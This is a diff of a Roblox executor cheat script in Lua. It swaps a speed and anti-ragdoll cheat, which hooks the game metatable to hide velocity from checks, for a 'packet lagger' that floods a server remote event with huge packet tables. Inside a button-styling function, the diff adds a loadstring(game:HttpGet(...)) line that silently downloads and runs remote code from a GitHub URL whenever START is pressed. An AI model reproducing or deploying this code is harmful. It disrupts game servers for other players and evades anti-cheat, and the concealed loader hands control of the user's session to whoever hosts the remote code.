@@ -1,760 +1,470 @@
-local Players = game:GetService("Players")
-local UIS = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local HttpService = game:GetService("HttpService")
-local player = Players.LocalPlayer
+-- Crystal Packet Lagger
 
--- ANTI DROP (lógica original de AumDuels): oculta la velocidad vertical
--- del HumanoidRootPart a las lecturas del juego y conserva las escrituras.
--- Se inicia automáticamente y no depende del interruptor de Speed.
-local AntiDropModule = {
-    Enabled = false,
-    Meta = nil,
-    OldIndex = nil,
-    OldNewIndex = nil,
-    SpoofedVelocity = Vector3.zero,
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+
+local player = Players.LocalPlayer
+while not player do
+	task.wait(0.1)
+	player = Players.LocalPlayer
+end
+
+local playerGui = player:FindFirstChildOfClass("PlayerGui")
+while not playerGui do
+	task.wait(0.1)
+	playerGui = player:FindFirstChildOfClass("PlayerGui")
+end
+
+local CONFIG_PATH = "CrystalLagger_Config.json"
+
+local COLORS = {
+	panelTop = Color3.fromRGB(14, 28, 48),
+	panelBot = Color3.fromRGB(10, 20, 36),
+	edge = Color3.fromRGB(64, 175, 255),
+	crystal = Color3.fromRGB(45, 170, 255),
+	crystalBr = Color3.fromRGB(125, 220, 255),
+	label = Color3.fromRGB(145, 195, 230),
+	white = Color3.fromRGB(240, 250, 255),
+	field = Color3.fromRGB(18, 36, 58),
+	fieldEdge = Color3.fromRGB(46, 105, 160),
+	stop = Color3.fromRGB(52, 70, 92),
 }
 
-local function startAntiDrop()
-    if AntiDropModule.Enabled then return true end
-    local getMeta = getrawmetatable
-    local makeReadonly = setreadonly
-    local wrapClosure = newcclosure
-    local callerCheck = checkcaller
-    if type(getMeta) ~= "function" or type(makeReadonly) ~= "function"
-        or type(wrapClosure) ~= "function" or type(callerCheck) ~= "function" then
-        warn("[Speed Anti Drop] El executor no ofrece las funciones necesarias.")
-        return false
-    end
+local running = false
+local power = 10000
+local keybind = Enum.KeyCode.C
+local keyName = "C"
+local collapsed = false
+local capturing = false
+local dragging = false
+local net
 
-    local ok, mt = pcall(getMeta, game)
-    if not ok or not mt then return false end
-    local oldIndex, oldNewIndex = mt.__index, mt.__newindex
-    if type(oldIndex) ~= "function" or type(oldNewIndex) ~= "function" then return false end
+local SIZE_OPEN = UDim2.fromOffset(240, 240)
+local SIZE_CLOSED = UDim2.fromOffset(240, 108)
+local START_POS_OPEN = UDim2.new(0.055, 0, 0, 173)
+local START_SIZE = UDim2.new(0.89, 0, 0, 38)
+local START_POS_CLOSED = UDim2.new(0.055, 0, 0, 56)
+local START_SIZE_CLOSED = UDim2.new(0.89, 0, 0, 38)
 
-    AntiDropModule.Meta = mt
-    AntiDropModule.OldIndex = oldIndex
-    AntiDropModule.OldNewIndex = oldNewIndex
-    local writable = pcall(makeReadonly, mt, false)
-    if not writable then
-        AntiDropModule.Meta = nil
-        AntiDropModule.OldIndex = nil
-        AntiDropModule.OldNewIndex = nil
-        return false
-    end
-
-    local hookOk = pcall(function()
-        mt.__index = wrapClosure(function(self, key)
-            if not callerCheck() and (key == "AssemblyLinearVelocity" or key == "Velocity")
-                and typeof(self) == "Instance" and self:IsA("BasePart")
-                and self.Name == "HumanoidRootPart" and player.Character
-                and self:IsDescendantOf(player.Character) then
-                return AntiDropModule.SpoofedVelocity
-            end
-            return oldIndex(self, key)
-        end)
-        mt.__newindex = wrapClosure(function(self, key, value)
-            if not callerCheck() and (key == "AssemblyLinearVelocity" or key == "Velocity")
-                and typeof(self) == "Instance" and self:IsA("BasePart")
-                and self.Name == "HumanoidRootPart" and player.Character
-                and self:IsDescendantOf(player.Character) then
-                AntiDropModule.SpoofedVelocity = value
-                return
-            end
-            return oldNewIndex(self, key, value)
-        end)
-    end)
-    pcall(makeReadonly, mt, true)
-    if not hookOk then
-        pcall(function()
-            makeReadonly(mt, false)
-            mt.__index = oldIndex
-            mt.__newindex = oldNewIndex
-            makeReadonly(mt, true)
-        end)
-        AntiDropModule.Meta = nil
-        AntiDropModule.OldIndex = nil
-        AntiDropModule.OldNewIndex = nil
-        return false
-    end
-
-    AntiDropModule.Enabled = true
-    return true
+local function mk(className, props, parent)
+	local inst = Instance.new(className)
+	for k, v in pairs(props) do
+		inst[k] = v
+	end
+	inst.Parent = parent
+	return inst
 end
 
--- Activación automática al ejecutar Speed; no agrega controles al panel.
-if not startAntiDrop() then
-    warn("[Speed Anti Drop] No se pudo activar Anti Drop en este entorno.")
+local function corner(obj, r)
+	mk("UICorner", { CornerRadius = UDim.new(0, r) }, obj)
 end
 
-local DEFAULT_SPEED = 21
-local TAP_INTERVAL = 0.5
-local CONFIG_FILE = "AutoSpd_" .. tostring(player.UserId) .. ".json"
-
--- Persiste datos en el almacenamiento local del executor, no solo en Attributes de la sesión.
-local config = {}
-if type(readfile) == "function" and type(isfile) == "function" then
-    pcall(function()
-        if isfile(CONFIG_FILE) then
-            config = HttpService:JSONDecode(readfile(CONFIG_FILE))
-        end
-    end)
+local function stroke(obj, color, thickness, transparency)
+	return mk("UIStroke", {
+		Color = color,
+		Thickness = thickness,
+		Transparency = transparency,
+		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
+	}, obj)
 end
-if type(config) ~= "table" then config = {} end
+
+local function tween(obj, props, t)
+	TweenService:Create(
+		obj,
+		TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+		props
+	):Play()
+end
+
+local function parsePower(text)
+	local n = tonumber(text)
+	if not n then
+		return power
+	end
+	return math.clamp(math.floor(n), 1, 100000)
+end
+
+task.spawn(function()
+	local tries = 0
+	local pkgs
+	while tries < 10 do
+		local ok, found = pcall(function()
+			return ReplicatedStorage:FindFirstChild("Packages")
+		end)
+		if ok and found then
+			pkgs = found
+			break
+		end
+		tries += 1
+		task.wait(0.5)
+	end
+	if not pkgs then
+		return
+	end
+	local netObj = pkgs:FindFirstChild("Net")
+	if not netObj then
+		task.wait(5)
+		netObj = pkgs:FindFirstChild("Net")
+	end
+	if not netObj then
+		return
+	end
+	net = netObj:GetChildren()[230]
+end)
 
 local function saveConfig()
-    if type(writefile) ~= "function" then return end
-    pcall(function()
-        writefile(CONFIG_FILE, HttpService:JSONEncode(config))
-    end)
+	if not writefile then
+		return
+	end
+	local ok, data = pcall(function()
+		return HttpService:JSONEncode({
+			Intensity = power,
+			Keybind = keyName,
+		})
+	end)
+	if ok then
+		pcall(writefile, CONFIG_PATH, data)
+	end
 end
 
-local speed = math.clamp(tonumber(config.speed) or tonumber(player:GetAttribute("CarrySavedSpeed")) or DEFAULT_SPEED, 16, 32)
-local enabled = player:GetAttribute("CarrySpeedEnabled") == true
-local antiRagdollEnabled = false -- siempre inicia desactivado
-local locked = true
-local minimized = config.minimized == true
-
-local originalSpeed = player:GetAttribute("CarryOriginalWalkSpeed") or 16
-
-local taps = 0
-local lastTap = 0
-
-local gui = Instance.new("ScreenGui")
-gui.Name = "CarrySpeedPanel"
-gui.ResetOnSpawn = false
-gui.Parent = player:WaitForChild("PlayerGui")
-
-local function corner(obj, radius)
-    local c = Instance.new("UICorner")
-    c.CornerRadius = UDim.new(0, radius)
-    c.Parent = obj
+local function loadConfig(textBox, keyBtn)
+	if not readfile or not isfile or not isfile(CONFIG_PATH) then
+		return
+	end
+	local ok, data = pcall(function()
+		return HttpService:JSONDecode(readfile(CONFIG_PATH))
+	end)
+	if not ok or type(data) ~= "table" then
+		return
+	end
+	if tonumber(data.Intensity) then
+		power = parsePower(data.Intensity)
+		textBox.Text = tostring(power)
+	end
+	if type(data.Keybind) == "string" and data.Keybind ~= "" then
+		local ok2, kb = pcall(function()
+			return Enum.KeyCode[data.Keybind]
+		end)
+		if ok2 and kb then
+			keyName = data.Keybind
+			keybind = kb
+			keyBtn.Text = "[" .. keyName .. "]"
+		end
+	end
 end
 
-local function makeButton(parent, text, size, pos)
-    local b = Instance.new("TextButton")
-    b.Size = size
-    b.Position = pos
-    b.Text = text
-    b.TextSize = 12
-    b.TextColor3 = Color3.new(1,1,1)
-    b.BackgroundColor3 = Color3.fromRGB(48,48,58)
-    b.BorderSizePixel = 0
-    b.Parent = parent
-    corner(b,5)
-    return b
+for _, name in ipairs({ "HookPacketLagger", "CrystalPacketLagger" }) do
+	local old = playerGui:FindFirstChild(name)
+	if old then
+		old:Destroy()
+	end
 end
 
--- PANEL
-local panel = Instance.new("Frame")
-panel.Size = UDim2.fromOffset(150,110)
-panel.AnchorPoint = Vector2.new(0.5,0.5)
-panel.Position = UDim2.fromScale(0.5,0.5)
-panel.BackgroundColor3 = Color3.fromRGB(25,25,30)
-panel.BorderSizePixel = 0
-panel.Parent = gui
-panel.Visible = not minimized
-corner(panel,8)
+local screenGui = mk("ScreenGui", {
+	Name = "CrystalPacketLagger",
+	ResetOnSpawn = false,
+	IgnoreGuiInset = true,
+	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+	DisplayOrder = 999,
+}, playerGui)
 
-local savedPanelX = tonumber(config.panelX) or player:GetAttribute("CarryPanelX")
-local savedPanelY = tonumber(config.panelY) or player:GetAttribute("CarryPanelY")
+local mainPanel = mk("Frame", {
+	Name = "MainPanel",
+	Position = UDim2.new(0.5, -120, 0.5, -120),
+	Size = SIZE_OPEN,
+	BackgroundColor3 = COLORS.panelTop,
+	BorderSizePixel = 0,
+	ClipsDescendants = true,
+	ZIndex = 2,
+}, screenGui)
+corner(mainPanel, 22)
+stroke(mainPanel, COLORS.edge, 2, 0.08)
 
-if savedPanelX and savedPanelY then
-    panel.Position = UDim2.fromOffset(savedPanelX,savedPanelY)
+local gradient = mk("UIGradient", { Rotation = 90 }, mainPanel)
+gradient.Color = ColorSequence.new({
+	ColorSequenceKeypoint.new(0, COLORS.panelTop),
+	ColorSequenceKeypoint.new(1, COLORS.panelBot),
+})
+
+local topbar = mk("Frame", {
+	Size = UDim2.new(1, 0, 0, 48),
+	BackgroundTransparency = 1,
+	BorderSizePixel = 0,
+	ZIndex = 5,
+}, mainPanel)
+
+local title = mk("TextLabel", {
+	Position = UDim2.new(0.055, 0, 0, 10),
+	Size = UDim2.new(0.74, 0, 0, 22),
+	BackgroundTransparency = 1,
+	Font = Enum.Font.GothamBold,
+	Text = "CRYSTAL PACKET LAGGER",
+	TextColor3 = COLORS.white,
+	TextScaled = true,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	ZIndex = 6,
+}, topbar)
+mk("UITextSizeConstraint", { MinTextSize = 11, MaxTextSize = 18 }, title)
+
+local minBtn = mk("TextButton", {
+	Name = "MinimizeButton",
+	AnchorPoint = Vector2.new(1, 0),
+	Position = UDim2.new(0.945, 0, 0, 8),
+	Size = UDim2.fromOffset(26, 26),
+	BackgroundColor3 = COLORS.field,
+	BorderSizePixel = 0,
+	AutoButtonColor = false,
+	Font = Enum.Font.GothamBold,
+	Text = "−",
+	TextColor3 = COLORS.white,
+	TextSize = 18,
+	ZIndex = 7,
+}, topbar)
+corner(minBtn, 8)
+stroke(minBtn, COLORS.fieldEdge, 1, 0.15)
+
+mk("Frame", {
+	Position = UDim2.new(0.055, 0, 0, 40),
+	Size = UDim2.new(0.89, 0, 0, 3),
+	BackgroundColor3 = COLORS.edge,
+	BorderSizePixel = 0,
+	ZIndex = 6,
+}, mainPanel)
+
+local powerLabel = mk("TextLabel", {
+	Position = UDim2.new(0.055, 0, 0, 56),
+	Size = UDim2.new(0.89, 0, 0, 14),
+	BackgroundTransparency = 1,
+	Font = Enum.Font.GothamBold,
+	Text = "POWER",
+	TextColor3 = COLORS.label,
+	TextScaled = true,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	ZIndex = 3,
+}, mainPanel)
+
+local powerBox = mk("TextBox", {
+	Position = UDim2.new(0.055, 0, 0, 72),
+	Size = UDim2.new(0.89, 0, 0, 32),
+	BackgroundColor3 = COLORS.field,
+	BorderSizePixel = 0,
+	ClearTextOnFocus = false,
+	Font = Enum.Font.GothamBold,
+	Text = tostring(power),
+	TextColor3 = COLORS.white,
+	TextScaled = true,
+	TextXAlignment = Enum.TextXAlignment.Center,
+	ZIndex = 3,
+}, mainPanel)
+corner(powerBox, 12)
+stroke(powerBox, COLORS.fieldEdge, 1, 0.25)
+mk("UITextSizeConstraint", { MinTextSize = 14, MaxTextSize = 20 }, powerBox)
+
+local keyLabel = mk("TextLabel", {
+	Position = UDim2.new(0.055, 0, 0, 112),
+	Size = UDim2.new(0.89, 0, 0, 14),
+	BackgroundTransparency = 1,
+	Font = Enum.Font.GothamBold,
+	Text = "KEYBIND",
+	TextColor3 = COLORS.label,
+	TextScaled = true,
+	TextXAlignment = Enum.TextXAlignment.Left,
+	ZIndex = 3,
+}, mainPanel)
+
+local keyBtn = mk("TextButton", {
+	Position = UDim2.new(0.055, 0, 0, 128),
+	Size = UDim2.new(0.89, 0, 0, 30),
+	BackgroundColor3 = COLORS.field,
+	BorderSizePixel = 0,
+	AutoButtonColor = false,
+	Font = Enum.Font.GothamBold,
+	Text = "[" .. keyName .. "]",
+	TextColor3 = COLORS.white,
+	TextScaled = true,
+	ZIndex = 3,
+}, mainPanel)
+corner(keyBtn, 12)
+stroke(keyBtn, COLORS.fieldEdge, 1, 0.25)
+mk("UITextSizeConstraint", { MinTextSize = 14, MaxTextSize = 20 }, keyBtn)
+
+local startBtn = mk("TextButton", {
+	Position = START_POS_OPEN,
+	Size = START_SIZE,
+	BackgroundColor3 = COLORS.crystal,
+	BorderSizePixel = 0,
+	AutoButtonColor = false,
+	Font = Enum.Font.GothamBold,
+	Text = "START",
+	TextColor3 = COLORS.white,
+	TextScaled = true,
+	ZIndex = 4,
+}, mainPanel)
+corner(startBtn, 14)
+local startStroke = stroke(startBtn, COLORS.crystalBr, 1.5, 1)
+mk("UITextSizeConstraint", { MinTextSize = 16, MaxTextSize = 22 }, startBtn)
+
+local function setStopLook()
+	tween(startBtn, { BackgroundColor3 = COLORS.stop })
+	startBtn.Text = "STOP"
+	tween(startStroke, { Transparency = 0 }, 0.15)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
 end
 
-local title = Instance.new("TextLabel")
-title.Size = UDim2.fromOffset(60,22)
-title.Position = UDim2.fromOffset(5,5)
-title.BackgroundTransparency = 1
-title.Text = "SPEED"
-title.TextColor3 = Color3.new(1,1,1)
-title.TextSize = 12
-title.Parent = panel
-
-local lockButton = makeButton(
-    panel,"Lock",
-    UDim2.fromOffset(48,20),
-    UDim2.fromOffset(72,6)
-)
-lockButton.TextSize = 9
-
-local minimize = makeButton(
-    panel,"-",
-    UDim2.fromOffset(20,20),
-    UDim2.fromOffset(125,5)
-)
-
-local speedBox = Instance.new("TextBox")
-speedBox.Size = UDim2.fromOffset(140,22)
-speedBox.Position = UDim2.fromOffset(5,33)
-speedBox.BackgroundColor3 = Color3.fromRGB(40,40,48)
-speedBox.TextColor3 = Color3.new(1,1,1)
-speedBox.Text = tostring(speed)
-speedBox.TextSize = 12
-speedBox.ClearTextOnFocus = false
-speedBox.Parent = panel
-corner(speedBox,5)
-
--- Anti Ragdoll (variante V2 portada de AumDuels). No se guarda en config,
--- por lo que siempre empieza desactivado al ejecutar Speed.
-local antiRagdollButton = makeButton(
-    panel, "Anti Ragdoll: OFF",
-    UDim2.fromOffset(140,20),
-    UDim2.fromOffset(5,61)
-)
-antiRagdollButton.TextSize = 10
-
-local antiRagdollConnection = nil
-local antiRagdollResetCooldown = 0
-local function updateAntiRagdollButton()
-    antiRagdollButton.Text = antiRagdollEnabled and "Anti Ragdoll: ON" or "Anti Ragdoll: OFF"
-    antiRagdollButton.BackgroundColor3 = Color3.fromRGB(48,48,58)
+local function setStartLook()
+	tween(startBtn, { BackgroundColor3 = COLORS.crystal })
+	startBtn.Text = "START"
+	tween(startStroke, { Transparency = 1 }, 0.15)
 end
 
-local function stopAntiRagdoll()
-    antiRagdollEnabled = false
-    if antiRagdollConnection then
-        antiRagdollConnection:Disconnect()
-        antiRagdollConnection = nil
-    end
-    antiRagdollResetCooldown = 0
-    updateAntiRagdollButton()
+local function togglePanel(c)
+	collapsed = c
+	if c then
+		powerLabel.Visible = false
+		powerBox.Visible = false
+		keyLabel.Visible = false
+		keyBtn.Visible = false
+		minBtn.Text = "+"
+		tween(startBtn, { Position = START_POS_CLOSED, Size = START_SIZE_CLOSED }, 0.18)
+		tween(mainPanel, { Size = SIZE_CLOSED }, 0.18)
+	else
+		minBtn.Text = "−"
+		tween(mainPanel, { Size = SIZE_OPEN }, 0.18)
+		tween(startBtn, { Position = START_POS_OPEN, Size = START_SIZE }, 0.18)
+		task.delay(0.08, function()
+			if not collapsed then
+				powerLabel.Visible = true
+				powerBox.Visible = true
+				keyLabel.Visible = true
+				keyBtn.Visible = true
+			end
+		end)
+	end
 end
 
-local function startAntiRagdoll()
-    if antiRagdollConnection then return end
-    antiRagdollEnabled = true
-    antiRagdollConnection = RunService.Heartbeat:Connect(function()
-        if not antiRagdollEnabled then return end
-        local char = player.Character
-        if not char then return end
-        local hum = char:FindFirstChildOfClass("Humanoid")
-        local root = char:FindFirstChild("HumanoidRootPart")
-        if not hum or not root or hum.Health <= 0 then return end
-        local state = hum:GetState()
-        if state == Enum.HumanoidStateType.Dead then return end
-        if state == Enum.HumanoidStateType.Physics
-            or state == Enum.HumanoidStateType.Ragdoll
-            or state == Enum.HumanoidStateType.FallingDown then
-            local now = os.clock()
-            if now - antiRagdollResetCooldown > 0.15 then
-                antiRagdollResetCooldown = now
-                pcall(function()
-                    if hum:GetState() == Enum.HumanoidStateType.GettingUp then return end
-                    if hum.Health <= 0 or hum:GetState() == Enum.HumanoidStateType.Dead then return end
-                    hum:ChangeState(Enum.HumanoidStateType.GettingUp)
-                    root.Velocity = Vector3.zero
-                    root.RotVelocity = Vector3.zero
-                    root.AssemblyLinearVelocity = Vector3.zero
-                    root.AssemblyAngularVelocity = Vector3.zero
-                    for _, obj in ipairs(char:GetDescendants()) do
-                        if obj:IsA("Motor6D") then obj.Enabled = true end
-                        if obj:IsA("Constraint") then obj.Enabled = true end
-                    end
-                    local camera = workspace.CurrentCamera
-                    if camera then camera.CameraSubject = hum end
-                    local playerScripts = player:FindFirstChild("PlayerScripts")
-                    local pm = playerScripts and playerScripts:FindFirstChild("PlayerModule")
-                    local controlModule = pm and pm:FindFirstChild("ControlModule")
-                    if controlModule then
-                        local control = require(controlModule)
-                        if control then control:Enable() end
-                    end
-                    hum.AutoRotate = true
-                    hum.PlatformStand = false
-                    hum.Sit = false
-                end)
-            end
-        end
-    end)
-    updateAntiRagdollButton()
-end
-
-antiRagdollButton.Activated:Connect(function()
-    if antiRagdollEnabled then stopAntiRagdoll() else startAntiRagdoll() end
-end)
-updateAntiRagdollButton()
-
--- Inf Hold (lógica original de AumDuels). No se guarda; inicia apagado.
-local InfiniteJump = {
-    enabled = false,
-    jumpPower = 55,
-    minVelocity = 30,
-    jumpConn = nil,
-    heartbeatConn = nil,
-}
-
-local infHoldButton = makeButton(
-    panel, "Inf Hold: OFF",
-    UDim2.fromOffset(140,20),
-    UDim2.fromOffset(5,84)
-)
-infHoldButton.TextSize = 10
-
-local function applyInfiniteJump(root)
-    if not root then return end
-    pcall(function()
-        root.Velocity = Vector3.new(root.Velocity.X, InfiniteJump.jumpPower, root.Velocity.Z)
-    end)
-end
-
-local function onInfiniteJumpRequest()
-    if not InfiniteJump.enabled then return end
-    local char = player.Character
-    if not char then return end
-    local root = char:FindFirstChild("HumanoidRootPart")
-    if root then applyInfiniteJump(root) end
-end
-
-local function onInfiniteJumpHeartbeat()
-    if not InfiniteJump.enabled then return end
-    local char = player.Character
-    if not char then return end
-    local root = char:FindFirstChild("HumanoidRootPart")
-    local hum = char:FindFirstChildOfClass("Humanoid")
-    if not root or not hum then return end
-    local jumpHeld = UIS:IsKeyDown(Enum.KeyCode.Space) or hum.Jump == true
-    if jumpHeld and root.Velocity.Y < InfiniteJump.minVelocity then
-        applyInfiniteJump(root)
-    end
-end
-
-local function startInfiniteJump()
-    if InfiniteJump.enabled then return end
-    InfiniteJump.enabled = true
-    InfiniteJump.jumpConn = UIS.JumpRequest:Connect(onInfiniteJumpRequest)
-    InfiniteJump.heartbeatConn = RunService.Heartbeat:Connect(onInfiniteJumpHeartbeat)
-    infHoldButton.Text = "Inf Hold: ON"
-    infHoldButton.BackgroundColor3 = Color3.fromRGB(48,48,58)
-end
-
-local function stopInfiniteJump()
-    InfiniteJump.enabled = false
-    if InfiniteJump.jumpConn then
-        InfiniteJump.jumpConn:Disconnect()
-        InfiniteJump.jumpConn = nil
-    end
-    if InfiniteJump.heartbeatConn then
-        InfiniteJump.heartbeatConn:Disconnect()
-        InfiniteJump.heartbeatConn = nil
-    end
-    infHoldButton.Text = "Inf Hold: OFF"
-    infHoldButton.BackgroundColor3 = Color3.fromRGB(48,48,58)
-end
-
-infHoldButton.Activated:Connect(function()
-    if InfiniteJump.enabled then stopInfiniteJump() else startInfiniteJump() end
+minBtn.MouseButton1Click:Connect(function()
+	togglePanel(not collapsed)
 end)
 
--- BOTÓN FLOTANTE
-local toggle = Instance.new("TextButton")
-toggle.Size = UDim2.fromOffset(30,30)
-toggle.AnchorPoint = Vector2.new(0.5,0.5)
-toggle.BackgroundTransparency = 1
-toggle.BorderSizePixel = 0
-toggle.TextSize = 9
-toggle.Parent = gui
-toggle.Visible = true
-toggle.Active = true
-
-local savedToggleX = tonumber(config.toggleX) or player:GetAttribute("CarryToggleX")
-local savedToggleY = tonumber(config.toggleY) or player:GetAttribute("CarryToggleY")
-
-if savedToggleX and savedToggleY then
-    toggle.Position = UDim2.fromOffset(savedToggleX,savedToggleY)
-else
-    toggle.Position = UDim2.new(0.5,-15,0.5,-15)
+local function startLagger()
+	if running then
+		return
+	end
+	if not net then
+		warn("[CrystalLagger] Event not ready yet — wait a moment and try again")
+		return
+	end
+	power = parsePower(powerBox.Text)
+	powerBox.Text = tostring(power)
+	running = true
+	setStopLook()
+	local packets = table.create(power, function() end)
+	task.spawn(function()
+		while running do
+			for _ = 1, 3 do
+				pcall(function()
+					net:FireServer(packets)
+				end)
+			end
+			task.wait(0.01)
+		end
+	end)
 end
 
-local function updateToggle()
-    toggle.Text = enabled and "ON" or "OFF"
-    toggle.TextColor3 = enabled
-        and Color3.fromRGB(0,255,100)
-        or Color3.fromRGB(255,60,60)
+local function doStop()
+	if not running then
+		return
+	end
+	running = false
+	setStartLook()
 end
 
-updateToggle()
-
--- DETECCIÓN DE CARRY / STEAL (misma lógica de AumDuels)
-local baselineHumanoid = nil
-local baselineWalkSpeed = nil
-local carryAttachment = nil
-local carryVelocity = nil
-
-local function readCarryFlag(container, name)
-    if not container then return false end
-    local ok, value = pcall(function() return container:GetAttribute(name) end)
-    if ok and value == true then return true end
-
-    local obj = container:FindFirstChild(name)
-    if obj then
-        if obj:IsA("BoolValue") then return obj.Value == true end
-        if obj:IsA("ObjectValue") then return obj.Value ~= nil end
-        if obj:IsA("StringValue") then return obj.Value ~= "" end
-    end
-    return false
+local function toggleStart()
+	if running then
+		doStop()
+	else
+		startLagger()
+	end
 end
 
-local function isCarrying()
-    local char = player.Character
-    if not char then return false end
+startBtn.MouseButton1Click:Connect(toggleStart)
 
-    local hum = char:FindFirstChildOfClass("Humanoid")
-    if not hum then return false end
-
-    local ws = hum.WalkSpeed
-    if baselineHumanoid ~= hum then
-        baselineHumanoid = hum
-        baselineWalkSpeed = ws
-    elseif not enabled and ws > (baselineWalkSpeed or ws) then
-        baselineWalkSpeed = ws
-    end
-
-    local base = baselineWalkSpeed or ws
-    local bySpeed = ws > 0 and base > 0
-        and ws <= base * 0.95 and (base - ws) >= 1
-
-    local byFlag = false
-    for _, name in ipairs({
-        "Stealing", "Carrying", "IsCarrying", "Grabbed",
-        "Holding", "StealHold", "HasGrab"
-    }) do
-        if readCarryFlag(player, name) or readCarryFlag(char, name) then
-            byFlag = true
-            break
-        end
-    end
-
-    return bySpeed or byFlag
-end
-
-local function destroyCarryVelocity()
-    if carryVelocity then pcall(function() carryVelocity:Destroy() end) end
-    if carryAttachment then pcall(function() carryAttachment:Destroy() end) end
-    carryVelocity = nil
-    carryAttachment = nil
-end
-
-local function applySpeed()
-    local char = player.Character
-    local hum = char and char:FindFirstChildOfClass("Humanoid")
-    local root = char and char:FindFirstChild("HumanoidRootPart")
-
-    if not hum or not root then
-        destroyCarryVelocity()
-        return
-    end
-
-    -- El botón ON arma el detector: al agarrar el objeto, Speed entra solo.
-    local carrying = isCarrying()
-    if not enabled or not carrying then
-        if carryVelocity then
-            carryVelocity.PlaneVelocity = Vector2.zero
-            carryVelocity.Enabled = false
-        end
-        return
-    end
-
-    -- No interferir con estados de caída ni con Bat Bypass.
-    local state = hum:GetState()
-    local ragdolled = state == Enum.HumanoidStateType.Physics
-        or state == Enum.HumanoidStateType.Ragdoll
-        or state == Enum.HumanoidStateType.FallingDown
-    local snowVS = _G.SnowVS
-    local batBypassActive = snowVS and snowVS.BatBypass
-        and snowVS.BatBypass.Enabled == true
-
-    if ragdolled or batBypassActive then
-        if carryVelocity then
-            carryVelocity.PlaneVelocity = Vector2.zero
-            carryVelocity.Enabled = false
-        end
-        return
-    end
-
-    if not carryVelocity or carryVelocity.Parent ~= root then
-        destroyCarryVelocity()
-        carryAttachment = Instance.new("Attachment")
-        carryAttachment.Name = "SpeedCarryAttachment"
-        carryAttachment.Parent = root
-
-        carryVelocity = Instance.new("LinearVelocity")
-        carryVelocity.Name = "SpeedCarryVelocity"
-        carryVelocity.Attachment0 = carryAttachment
-        carryVelocity.VelocityConstraintMode = Enum.VelocityConstraintMode.Plane
-        carryVelocity.PrimaryTangentAxis = Vector3.new(1, 0, 0)
-        carryVelocity.SecondaryTangentAxis = Vector3.new(0, 0, 1)
-        carryVelocity.RelativeTo = Enum.ActuatorRelativeTo.World
-        carryVelocity.MaxForce = 2200
-        carryVelocity.PlaneVelocity = Vector2.zero
-        carryVelocity.Parent = root
-    end
-
-    carryVelocity.Enabled = true
-    local direction = hum.MoveDirection
-    if direction.Magnitude > 0.1 then
-        local flat = Vector3.new(direction.X, 0, direction.Z).Unit
-        carryVelocity.PlaneVelocity = Vector2.new(flat.X * speed, flat.Z * speed)
-    else
-        carryVelocity.PlaneVelocity = Vector2.zero
-    end
-end
-
-local function setEnabled(value)
-    enabled = value
-    player:SetAttribute("CarrySpeedEnabled", enabled)
-    updateToggle()
-    if not enabled then
-        destroyCarryVelocity()
-    else
-        applySpeed()
-    end
-end
-
-speedBox.FocusLost:Connect(function()
-    local n = tonumber(speedBox.Text)
-
-    if n then
-        speed = math.clamp(n,16,32)
-        speedBox.Text = tostring(speed)
-        player:SetAttribute("CarrySavedSpeed",speed)
-        config.speed = speed
-        saveConfig()
-
-        if enabled then
-            applySpeed()
-        end
-    else
-        speedBox.Text = tostring(speed)
-    end
+powerBox.FocusLost:Connect(function()
+	power = parsePower(powerBox.Text)
+	powerBox.Text = tostring(power)
+	saveConfig()
 end)
 
--- LOCK / UNLOCK
-lockButton.Activated:Connect(function()
-    locked = not locked
-    lockButton.Text = locked and "Lock" or "UnLock"
-    lockButton.TextSize = locked and 9 or 7
+keyBtn.MouseButton1Click:Connect(function()
+	if capturing then
+		return
+	end
+	capturing = true
+	keyBtn.Text = "[PRESS KEY]"
+	keyBtn.TextColor3 = COLORS.crystalBr
 end)
 
--- MINIMIZAR
-minimize.Activated:Connect(function()
-    minimized = true
-    panel.Visible = false
-    toggle.Visible = true
-    config.minimized = true
-    saveConfig()
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+	if gameProcessed then
+		return
+	end
+	if capturing then
+		if input.UserInputType == Enum.UserInputType.Keyboard
+			and input.KeyCode ~= Enum.KeyCode.Unknown
+			and input.KeyCode ~= Enum.KeyCode.Escape
+		then
+			keybind = input.KeyCode
+			keyName = input.KeyCode.Name
+			keyBtn.Text = "[" .. keyName .. "]"
+			keyBtn.TextColor3 = COLORS.white
+			capturing = false
+			saveConfig()
+		end
+		return
+	end
+	if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == keybind then
+		toggleStart()
+	end
 end)
 
--- ARRASTRE DEL BOTÓN FLOTANTE
-local dragging = false
-local dragInput
-local dragStart
-local startPos
-local moved = false
-local suppressClick = false
-
-toggle.InputBegan:Connect(function(input)
-    if locked then return end
-
-    if input.UserInputType == Enum.UserInputType.Touch
-    or input.UserInputType == Enum.UserInputType.MouseButton1 then
-        dragging = true
-        dragInput = input
-        dragStart = input.Position
-        startPos = toggle.Position
-        moved = false
-    end
+local startPos, startPanelPos
+mainPanel.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1
+		or input.UserInputType == Enum.UserInputType.Touch
+	then
+		dragging = true
+		startPos = input.Position
+		startPanelPos = mainPanel.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
 end)
 
-UIS.InputChanged:Connect(function(input)
-    if not dragging or locked then return end
-
-    local valid =
-        (dragInput.UserInputType == Enum.UserInputType.Touch and input == dragInput)
-        or
-        (dragInput.UserInputType == Enum.UserInputType.MouseButton1
-        and input.UserInputType == Enum.UserInputType.MouseMovement)
-
-    if not valid then return end
-
-    local delta = input.Position - dragStart
-
-    if delta.Magnitude > 5 then
-        moved = true
-    end
-
-    if moved then
-        toggle.Position = UDim2.new(
-            startPos.X.Scale,
-            startPos.X.Offset + delta.X,
-            startPos.Y.Scale,
-            startPos.Y.Offset + delta.Y
-        )
-    end
-end)
-
-UIS.InputEnded:Connect(function(input)
-    if dragging and (
-        input == dragInput or
